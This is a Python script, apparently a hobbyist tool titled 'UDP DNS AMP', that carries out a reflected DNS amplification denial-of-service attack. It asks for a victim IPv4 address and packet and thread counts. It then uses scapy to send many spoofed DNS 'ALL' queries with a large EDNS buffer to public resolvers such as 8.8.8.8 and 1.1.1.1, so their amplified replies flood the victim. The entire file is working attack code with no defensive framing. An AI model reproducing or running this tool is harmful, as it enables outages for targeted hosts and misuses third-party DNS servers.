# UDP DNS AMP
# code by </OƝion
from scapy.all import send, RandShort 
from scapy.layers.inet import IP , UDP 
from scapy.layers.dns import DNS , DNSQR ,DNSRROPT

from threading import Thread
from time import sleep
from random import choice, randint
from os import system

def clear():
    system('clear' or 'cls')


def logo() :
    clear()
    print(color.RED+"""
\n
 ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░     
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒   DNS AMP
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  V:0.0.2
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
    ░ ░           ░  ░      ░ ░ </OƝioN

"""+color.GREEN)




class color : 
    GREEN = '\033[92m'
    RED = '\033[91m'
    YEL = '\033[93m'


def START():
    target = str(input(color.GREEN+"[>] Target IPv4:"+color.YEL))
    count = int(input(color.GREEN+"[>] Count:"+color.YEL))
    tread_count = int(input(color.GREEN+"[>] tread:"+color.YEL))
    count_packet_tread = int(count / tread_count)

    #target_port=int(input(color.GREEN+"[>] port:"+color.YEL))
    input(color.GREEN+'[>] ENTER for START or Ctrl+C')
    print('sending..')

    dns_server_names = ['8.8.8.8', '185.51.200.2','178.22.122.100', '1.1.1.1']
    domains = ['1-2.ir', 'google.com', 'iran.ir', \
            'alman.ir', 'irancell.ir', 'mtn.ir', 'mci.ir','shatel.ir','rightel.ir','parsvds.ir']


    def udp_dns(target, count_packet_tread, dns_server_names, domains):
        ipId = randint(0,0xffff)
        dnsId = randint(0,0xffff)

        for _ in range(count_packet_tread):
            nameserver = choice(dns_server_names) # DNS server
            domain = choice(domains) # domain name
            ipId = randint(0,0xffff)
            dnsId = randint(0,0xffff)
            # packet:
            udp = UDP(sport=RandShort())
            ip  = IP(src=target, dst=nameserver, ttl=128 , id=ipId)
            dns = DNS(rd=1,id=dnsId, qdcount=1, qd=DNSQR(qname=domain,qtype='ALL'),ar=DNSRROPT(rclass=4096))
            packet = (ip/udp/dns)
            send(packet)#, verbose=False)
            ipId += 1
            dnsId += 1
        
    
    for _ in range(tread_count):
        try:
            x = Thread(target=udp_dns, args=(target, count_packet_tread, dns_server_names, domains))
            x.start()
            sleep(.05)
        
        except:
            pass

    print(color.RED+'[-] DONE')
    sleep(1)
    logo()
    print(color.RED+'[-] DONE\n')
    print(color.YEL+f'[*] {count} packet sended to {target}'+color.RED)










if __name__ == "__main__":
    logo()
    START()
